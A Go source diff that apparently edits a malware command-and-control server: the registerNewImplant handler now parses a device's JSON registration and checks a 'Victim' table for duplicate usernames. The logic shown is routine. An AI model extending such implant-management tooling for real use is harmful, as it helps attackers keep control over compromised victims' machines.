@@ -1,8 +1,10 @@
 package main
 
 import (
+	"database/sql"
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
 )
@@ -64,13 +66,36 @@ func getClients(w http.ResponseWriter, r *http.Request) {
 // On hit, take the request and perform actions to then register it to the databas
 func registerNewImplant(w http.ResponseWriter, r *http.Request) {
 
-	// First, we receive the response which will be JSON data, unmarshall it and put it in the Device struct
-	defer r.Body.Close()
-	var device Device
-	decoder := json.NewDecoder(r.Body)
-	err := decoder.Decode(&device)
+	// First, read the entire body
+	bodyBytes, err := ioutil.ReadAll(r.Body)
 	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
+		http.Error(w, "Error reading request body", http.StatusBadRequest)
+		return
+	}
+	defer r.Body.Close()
+
+	// Decode the body into the Device struct
+	var device Device
+	err = json.Unmarshal(bodyBytes, &device)
+	if err != nil {
+		http.Error(w, "Error decoding request body: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+
+	// Check if the user already exists in the database
+	var existingUserID int
+	err = db.QueryRow("SELECT id FROM Victim WHERE username = ?", device.Username).Scan(&existingUserID)
+	if err != nil {
+		if err != sql.ErrNoRows {
+			log.Printf("Error querying existing user: %v\n", err)
+			http.Error(w, "Internal server error", http.StatusInternalServerError)
+			return
+		}
+		// No existing user found; continue with registration
+	} else {
+		// Existing user found, return an appropriate response
+		log.Printf("User already exists: %s\n", device.Username)
+		http.Error(w, "User already exists", http.StatusConflict) // or another appropriate status
 		return
 	}
 
